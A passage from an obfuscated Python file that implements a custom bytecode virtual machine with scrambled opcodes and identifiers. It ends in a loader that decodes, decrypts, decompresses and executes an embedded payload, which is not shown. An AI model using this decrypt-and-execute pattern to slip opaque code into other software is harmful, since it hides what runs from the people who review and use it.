        registers[_dst] = locals_dict.get(_name, globals_dict.get(_name, builtins_dict.get(_name) if builtins_dict else None))
        if registers[_dst] is None and _name not in locals_dict and (_name not in globals_dict) and (not builtins_dict or _name not in builtins_dict):
         raise NameError(f"name '{_name}' is not defined")
      elif opcode == 2386:
       _d, _b, _c = arg; registers[_d] = set((registers[_b + i] for i in range(_c)))
      elif opcode == 2391:
       if registers[arg[0]]: frame._iw1lxa9q8 = arg[1]
     elif opcode < 2604:
      if opcode < 2530:
       if opcode == 2421:
        _it, _dst, _tgt = arg
        try:
         registers[_dst] = next(registers[_it])
        except StopIteration:
         frame._iw1lxa9q8 = _tgt
      elif opcode == 2530:
       registers[arg[0]] = registers[arg[1]] | registers[arg[2]]
      elif opcode == 2577:
       _a = registers[arg[1]]; _b = registers[arg[2]]; registers[arg[0]] = _a * _b
     elif opcode < 2936:
      if opcode == 2604:
       _d, _b, _c = arg
       registers[_d] = slice(registers[_b], registers[_b + 1]) if _c == 2 else slice(registers[_b], registers[_b + 1], registers[_b + 2])
      elif opcode == 2627:
       frame._iw1lxa9q8 = arg
     elif opcode == 2936:
      _a = registers[arg[1]]; _b = registers[arg[2]]; registers[arg[0]] = _a + _b
     elif opcode == 2958:
      _d, _b, _c = arg; registers[_d] = tuple((registers[_b + i] for i in range(_c)))
    elif opcode < 4040:
     if opcode < 3720:
      if opcode < 3527:
       if opcode < 3379:
        if opcode < 3302:
         if opcode == 3042:
          _dst, _fn, _fl = arg; _args = registers[_fn + 1]; _kwargs = registers[_fn + 2] if _fl & 1 else {}
          registers[_dst] = registers[_fn](*_args, **_kwargs)
        elif opcode == 3302:
         _r, _tgt = arg
         if not bool(registers[_r]): frame._iw1lxa9q8 = _tgt
        elif opcode == 3303:
         registers[arg[0]] = registers[arg[1]] & registers[arg[2]]
       elif opcode < 3432:
        if opcode == 3379: registers[arg[0]] = ~registers[arg[1]]
       elif opcode == 3432:
        _dst, _fn, _argc = arg; registers[_dst] = registers[_fn](*[registers[_fn + 1 + i] for i in range(_argc)])
       elif opcode == 3497:
        _d, _m, _n = arg; registers[_d] = getattr(registers[_m], names[_n])
      elif opcode < 3601:
       if opcode < 3557:
        if opcode == 3527: _v = fastlocals[arg[1]]; registers[arg[0]] = _v
       elif opcode == 3557:
        _ret = registers[arg]; _it5nggq93 = _ret
        if _owgvhwqizt(_it5nggq93): continue
        return _it5nggq93
       elif opcode == 3567:
        registers[arg[0]].add(registers[arg[1]])
      elif opcode < 3691:
       if opcode == 3601:
        def _psx7qqpc6(func, name, *bases, **kwds):
         meta = kwds.get('metaclass')
         if meta is None: meta = type(bases[0]) if bases else type
         ns = meta.__prepare__(name, bases, **kwds) if hasattr(meta, '__prepare__') else {}
         if hasattr(func, 'execute_with_locals'):
          func.execute_with_locals(ns)
         elif callable(func):
          func()
         cls = meta(name, bases, ns, **kwds)
         for item in ns.values():
          if hasattr(item, '__code__') or hasattr(item, '__class_owner__'): item.__class_owner__ = cls
         return cls
        registers[arg] = _psx7qqpc6
      elif opcode == 3691:
       registers[arg[0]] = fastlocals[arg[1]]
      elif opcode == 3706:
       _dst, _idx = arg; registers[_dst] = consts[_idx]
     elif opcode < 3860:
      if opcode < 3763:
       if opcode < 3752:
        if opcode == 3720: _o, _k = arg; del registers[_o][registers[_k]]
       elif opcode == 3752:
        registers[arg[0]] = registers[arg[1]] * registers[arg[2]]
       elif opcode == 3759:
        registers[arg[0]] = frame._dweemxxb[arg[1]].val
      elif opcode < 3832:
       if opcode == 3763: setattr(registers[arg[0]], names[arg[1]], registers[arg[2]])
      elif opcode == 3832:
       _dst, _creg, _flags = arg; _cobj = registers[_creg]
       _cells = tuple((frame._dweemxxb[frame._fja56j8ci.cellvars.index(v)] if v in frame._fja56j8ci.cellvars else frame._dweemxxb[len(frame._fja56j8ci.cellvars) + frame._fja56j8ci.freevars.index(v)] for v in _cobj.freevars)) if _cobj.freevars else ()
       _defs = registers[_dst] if _flags & 1 else ()
       _kwdefs = (registers[_dst + 1] if _flags & 1 else registers[_dst]) if _flags & 2 else {}
       registers[_dst] = _dzyz89jo9t(_cobj, globals_dict, defaults=_defs or (), kw_defaults=_kwdefs or {}, closure=_cells)
      elif opcode == 3855:
       registers[arg[0]] = registers[arg[1]] / registers[arg[2]]
     elif opcode < 3959:
      if opcode < 3884:
       if opcode == 3860:
        _idx, _src = arg
        while len(fastlocals) <= _idx: fastlocals.append(None)
        fastlocals[_idx] = registers[_src]
      elif opcode == 3884:
       _l = registers[arg[0]]; _r = registers[arg[1]]; _c = arg[2]; _res = False
       if _c == 0:
        _res = _l < _r
       elif _c == 1:
        _res = _l <= _r
       elif _c == 2:
        _res = _l == _r
       elif _c == 3:
        _res = _l != _r
       elif _c == 4:
        _res = _l > _r
       elif _c == 5:
        _res = _l >= _r
       elif _c == 6:
        _res = _l in _r
       elif _c == 7:
        _res = _l not in _r
       elif _c == 8:
        _res = _l is _r
       elif _c == 9:
        _res = _l is not _r
       elif _c == 10:
        _res = isinstance(_l, _r) or (isinstance(_l, type) and issubclass(_l, _r))
       registers[arg[0]] = _res
      elif opcode == 3933:
       _r, _tgt = arg
       if bool(registers[_r]): frame._iw1lxa9q8 = _tgt
     elif opcode < 4020:
      if opcode == 3959:
       _nidx, _src = arg; globals_dict[names[_nidx]] = registers[_src]
      elif opcode == 3987:
       registers[arg[0]] = registers[arg[1]](*[registers[arg[1] + 1 + i] for i in range(arg[2])])
     elif opcode == 4020:
      _obj, _k, _v = arg; registers[_obj][registers[_k]] = registers[_v]
     elif opcode == 4031:
      _fl = fastlocals; _co = consts; _d0_c = _co[0]; registers[0] = _d0_c; _d1_v = registers[0]
      while len(_fl) <= 0: _fl.append(None)
      _fl[0] = _d1_v; _n = names[0]
      _d2_g = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
      registers[0] = _d2_g; _d3_c = _co[1]; registers[1] = _d3_c
    elif opcode < 4487:
     if opcode < 4202:
      if opcode < 4126:
       if opcode < 4082:
        if opcode == 4040: registers[arg[0]] = registers[arg[1]] << registers[arg[2]]
       elif opcode == 4082:
        _lr, _vr = arg; registers[_lr].append(registers[_vr])
       elif opcode == 4121:
        _d, _s2, _op = arg; _left_v = registers[_d]; _right_v = registers[_s2]
        if _op == 2:
         registers[_d] = _left_v == _right_v
        elif _op == 3:
         registers[_d] = _left_v != _right_v
        elif _op == 0:
         registers[_d] = _left_v < _right_v
        elif _op == 1:
         registers[_d] = _left_v <= _right_v
        elif _op == 4:
         registers[_d] = _left_v > _right_v
        elif _op == 5:
         registers[_d] = _left_v >= _right_v
        elif _op == 6:
         registers[_d] = _left_v in _right_v
        elif _op == 7:
         registers[_d] = _left_v not in _right_v
        elif _op == 8:
         registers[_d] = _left_v is _right_v
        elif _op == 9:
         registers[_d] = _left_v is not _right_v
        elif _op == 10:
         registers[_d] = isinstance(_left_v, _right_v) or (isinstance(_left_v, type) and issubclass(_left_v, _right_v))
      elif opcode < 4144:
       if opcode == 4126: frame._iw1lxa9q8 = arg
      elif opcode == 4144:
       if not registers[arg[0]]: frame._iw1lxa9q8 = arg[1]
      elif opcode == 4198:
       _c, _r1, _r2 = arg
       if _c == 0:
        raise
       elif _c == 1:
        raise registers[_r1]
       elif _c == 2:
        raise registers[_r1] from registers[_r2]
     elif opcode < 4296:
      if opcode < 4230:
       if opcode == 4202: frame._v7yojfajrj.append(_lpovres1v(_cmukq5zuaz.FINALLY, arg, 0))
      elif opcode == 4230:
       _n = names[arg]
       if _n in locals_dict:
        del locals_dict[_n]
       elif _n in globals_dict:
        del globals_dict[_n]
       else:
        raise NameError(f"name '{_n}' is not defined")
      elif opcode == 4293:
       _d, _obj, _k = arg; registers[_d] = registers[_obj][registers[_k]]
     elif opcode < 4481:
      if opcode == 4296:
       _c = consts[arg[1]]; registers[arg[0]] = _c
      elif opcode == 4479:
       registers[arg[0]] = registers[arg[1]] // registers[arg[2]]
     elif opcode == 4481:
      registers[arg[0]] = registers[arg[1]] >> registers[arg[2]]
     elif opcode == 4486:
      _nidx, _src = arg; locals_dict[names[_nidx]] = registers[_src]
    elif opcode < 4766:
     if opcode < 4579:
      if opcode < 4500:
       if opcode == 4487:
        _name = names[arg[1]]
        if _name in globals_dict:
         registers[arg[0]] = globals_dict[_name]
        elif builtins_dict and _name in builtins_dict:
         registers[arg[0]] = builtins_dict[_name]
        else:
         raise NameError(f"name '{_name}' is not defined")
      elif opcode == 4500:
       _d, _s1, _s2 = arg; _a = registers[_s1]; _b = registers[_s2]
       frame._m9w4x7m1 = (frame._m9w4x7m1 * 1103515245 + 12345 ^ (_a if type(_a) is int else 0)) & 4294967295
       registers[_d] = (_a | _b) - (_a & _b) if type(_a) is int and type(_b) is int else _a ^ _b
      elif opcode == 4569:
       _d0_v = registers[0]
       while len(fastlocals) <= 1: fastlocals.append(None)
       fastlocals[1] = _d0_v; _d1_v = fastlocals[1]; registers[0] = _d1_v; _d2_v = fastlocals[0]; registers[1] = _d2_v; _d3_0 = registers[0]
       _d3_1 = registers[1]; _d3_res = _d3_0 == _d3_1; registers[0] = _d3_res; _d4_c = registers[arg[0]]
       if _d4_c:
        pass
       else:
        frame._iw1lxa9q8 = arg[1]
     elif opcode < 4595:
      if opcode == 4579: registers[arg[0]][registers[arg[1]]] = registers[arg[2]]
     elif opcode == 4595:
      registers[arg[0]] = registers[arg[1]] ** registers[arg[2]]
     elif opcode == 4714:
      registers[arg[0]] = registers[arg[1]] << registers[arg[2]]
    elif opcode < 4814:
     if opcode < 4786:
      if opcode == 4766:
       _dst, _nidx = arg; _name = names[_nidx]
       registers[_dst] = globals_dict.get(_name, builtins_dict.get(_name) if builtins_dict else None)
       if registers[_dst] is None and _name not in globals_dict and (not builtins_dict or _name not in builtins_dict):
        raise NameError(f"name '{_name}' is not defined")
     elif opcode == 4786:
      registers[arg[0]] = registers[arg[1]] * registers[arg[2]]
     elif opcode == 4810:
      _ret = registers[arg]; _it5nggq93 = _ret
      if _owgvhwqizt(_it5nggq93): continue
      return _it5nggq93
    elif opcode < 4902:
     if opcode == 4814:
      _fl = fastlocals; _co = consts; _n = names[arg[0]]
      _d0_g = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
      registers[0] = _d0_g; _d1_c = _co[arg[1]]; registers[1] = _d1_c
     elif opcode == 4826:
      registers[arg[0]] = registers[arg[1]]
    elif opcode == 4902:
     registers[arg[0]] = getattr(registers[arg[1]], names[arg[2]])
    elif opcode == 4909:
     if not registers[arg[0]]: frame._iw1lxa9q8 = arg[1]
    if frame._mt83x8dfo is not None: _jgsqssjdh = frame._mt83x8dfo; frame._mt83x8dfo = None; _u78aryq6r(_jgsqssjdh); continue
   except Exception as exc:
    handled = False
    while True:
     while frame._v7yojfajrj:
      b = frame._v7yojfajrj.pop()
      if b.type == _cmukq5zuaz.WITH:
       suppress = False
       if b.exit_fn:
        try:
         suppress = bool(b.exit_fn(type(exc), exc, exc.__traceback__))
        except Exception:
         suppress = False
       if suppress: frame._iw1lxa9q8 = b.handler_pc; handled = True; break
      elif b.type in (_cmukq5zuaz.EXCEPT, _cmukq5zuaz.FINALLY):
       registers[0] = exc; frame._iw1lxa9q8 = b.handler_pc; handled = True; break
     if handled: break
     if _bxgx7b5x:
      frame = _bxgx7b5x.pop(); code = frame._fja56j8ci; instructions = code.instructions; consts = code.consts; names = code.names
      registers = frame._gmwtr2ugw; fastlocals = frame._ik3cz5kl0; globals_dict = frame._jdu94lqw; locals_dict = frame._wbovvpyens
      builtins_dict = globals_dict.get('__builtins__')
      if isinstance(builtins_dict, type(_sys)):
       builtins_dict = builtins_dict.__dict__
      elif hasattr(builtins_dict, '__dict__'):
       builtins_dict = builtins_dict.__dict__
     else:
      break
    if not handled: raise
  return None
 finally:
  _qof3n8oc4 = old_frame
def _vmaxu74y7t():
 _psn = _pevykpfe2v(); decrypted = _bl7dy2sq8(_b64.b85decode(_pvidmb9n()), _abnfqejjfk()); raw = _zlib.decompress(decrypted)
 reader = _dss4divu2(raw); root_code = _vyhj9729s(reader); g = globals()
 if '__builtins__' not in g: g['__builtins__'] = _builtins
 f = _e8syzpf5(root_code, g, locals_dict=g)
 if _psn: f._m9w4x7m1 ^= _psn
 return _au7c2iw18(f)
_vmaxu74y7t()
